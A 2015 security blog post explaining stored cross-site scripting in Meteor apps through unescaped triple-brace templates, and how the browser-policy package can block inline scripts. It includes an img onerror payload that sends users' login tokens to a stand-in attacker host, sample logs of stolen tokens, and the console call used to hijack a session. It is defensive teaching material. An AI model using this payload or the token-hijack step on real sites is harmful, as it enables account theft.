---
layout: post
title:  "Hijacking Meteor Accounts With XSS"
titleParts: ["Hijacking Meteor Accounts", "With XSS"]
date:   2015-09-07
tags: ['security']
---

You've probably heard the term "XSS", or [cross-site scripting](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting), floating around the Meteor community. You've probably also heard that the <code class="language-*">browser-policy</code> package prevents XSS. Great! But... What is XSS?

Let's pretend that we've built an awesome new [Telescope](https://github.com/TelescopeJS/Telescope) application, and we've decided to get a little radical with our design. We've given our users the ability to embed images in their post titles! Our custom <code class="language-javascript">post_title</code> template looks something like this:

<pre class="language-markup"><code class="language-markup">&lt;template name="custom_post_title"&gt;
  &lt;h3 class="post-title &#123;&#123;moduleClass&#125;&#125;"&gt;
    &lt;a href="&#123;&#123;this.getLink&#125;&#125;"&gt;&#123;&#123;&#123;title&#125;&#125;&#125;&lt;/a&gt;
  &lt;/h3&gt;
&lt;/template&gt;
</code></pre>

Great! Now our users can use <code class="language-markup">&lt;img&gt;</code> tags to embed pictures directly in their post titles. There's absolutely nothing that go wrong here, right? Well...

## The Dangers of XSS

This change has actually exposed our application to a particularly dangerous form of cross-site scripting; [Stored XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)#Stored_XSS_Attacks). We've given users the ability to enter potentially malicious markup in their titles. Check out this example title:

<pre class="language-markup"><code class="language-markup">&lt;img src="fakeurl"
     onerror="$.get('//www.malicio.us/'+localStorage['Meteor.loginToken'])"
     alt="Cats suck!"&gt;
</code></pre>

Now, imagine that the bad person who posted this title has a simple web server running on <code class="language-*">www.malicio.us</code> listening for and logging any <code class="language-*">GET</code> requests it recieves. After a few innocent users stumble across this post on our Telescope application, their sensitive login tokens would be pulled from their local storage and sent to <code class="language-*">malicio.us</code>. The <code class="language-*">malicio.us</code> web logs would look something like this:

<pre class="language-bash"><code class="language-bash">GET http://www.malicio.us/g8Ri6DxKc3lSwqnYxHCJ0xE-XjMPf3jX-p_xSUPnN-D
GET http://www.malicio.us/LPPp7Tdb_qveRwa7-dLeCAxpqpc9oYM53Gt0HG6kwQ5
GET http://www.malicio.us/go9olSuebBjfQQqTrL-86d_LlfcctG848r7dBhW_kCL
</code></pre>

The attacker who posted the malicious title could easily steal any of these active sessions by navigating to our Meteor application and running the following code in their browser console:

<pre class="language-javascript"><code class="language-javascript">Meteor.loginWithToken("g8Ri6DxKc3lSwqnYxHCJ0xE-XjMPf3jX-p_xSUPnN-D");
</code></pre>

And just like that, a user's account has been stolen.

<hr/>

The crux of the issue here is that we're using a [triple-brace tag](https://github.com/meteor/meteor/tree/devel/packages/spacebars#triple-braced-tags) to insert raw HTML directly into the DOM. Without any kind of sanitation or validation, we have no way of knowing that users aren't providing us with malicious markup that will potentially run on all of our users' browsers.

In this case, the attacker simply grabbed the current user's `loginToken` out of local storage with the intent of hijacking their account. XSS attacks can be far more sophisticated, though. They can be as subtle as silently calling methods on behalf of the client, and as lavish as constructing entire user interface components designed to extract sensitive information (credentials, credit card numbers, etc…) from users.

Your Meteor application is not solely exposed to cross-site scripting through the use of triple-brace tags. Malicious HTML/JavaScript can be introduced into your [Blaze](https://www.meteor.com/blaze)-powered application through the use of [SafeString](https://github.com/meteor/meteor/blob/devel/packages/spacebars/README.md#safestring), [dynamic attributes](https://github.com/meteor/meteor/blob/devel/packages/spacebars/README.md#dynamic-attributes), and dynamic [attribute values](https://github.com/meteor/meteor/blob/devel/packages/spacebars/README.md#in-attribute-values), to name a few. When using these techniques with user-provided data, be especially sure that you're properly sanitizing or validating the data before sending it into the DOM.

## Browser-policy as a safety net

The [browser-policy](https://github.com/meteor/meteor/tree/devel/packages/browser-policy) package enables your Meteor application to establish its [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/Security/CSP/Introducing_Content_Security_Policy), or CSP. The goal of CSP is to prevent unexpected JavaScript from running on your page.

However, <code class="language-*">browser-policy</code> package is not a turnkey solution to our XSS problem. It requires some configuration to be especially useful. David Weldon has an [excellent guide](https://dweldon.silvrback.com/browser-policy) outlining the benefits of using <code class="language-*">browser-policy</code> and how to go about tuning it to your application. For our application, we would want to make sure that we're disallowing inline scripts:

<pre class="language-javascript"><code class="language-javascript">BrowserPolicy.content.disallowInlineScripts();
</code></pre>

By disallowing inline scripts, the JavaScript found in the <code class="language-javascript">onerror</code> of the image tag would not be allowed to run. This would effectively stop the XSS attack dead in its tracks.

While CSP is an amazing tool that can be used to harden your application against attackers, I believe that it should be considered your last line of defense. You should always try to find and eradicate all potential sources of cross-site scripting, rather than relying on the <code class="language-*">browser-policy</code> to prevent it. There is always the chance that you may have misconfigured your <code class="language-*">browser-policy</code>. On top of that, Content Security Policy [isn't supported on older browsers](http://caniuse.com/#feat=contentsecuritypolicy).

## Final Thoughts

Keep in mind that this was just a single example of cross-site scripting in action. Attackers can use a variety of other techniques and methods in order to achieve their nefarious intents.

The truth is, XSS attacks are relatively rare in Meteor applications. The Meteor team made a great decision when going with a secure default for value interpolation ([double-brace tags](https://github.com/meteor/meteor/tree/devel/packages/spacebars#double-braced-tags)). However, there are [still scenarios](http://blog.east5th.co/2015/04/03/black-box-meteor-triple-brace-xss/) where XSS can rear its ugly head in your Meteor application. In addition to using and configuring `browser-policy`, you should try to identify and fix any potential areas where cross-site scripting may occur.
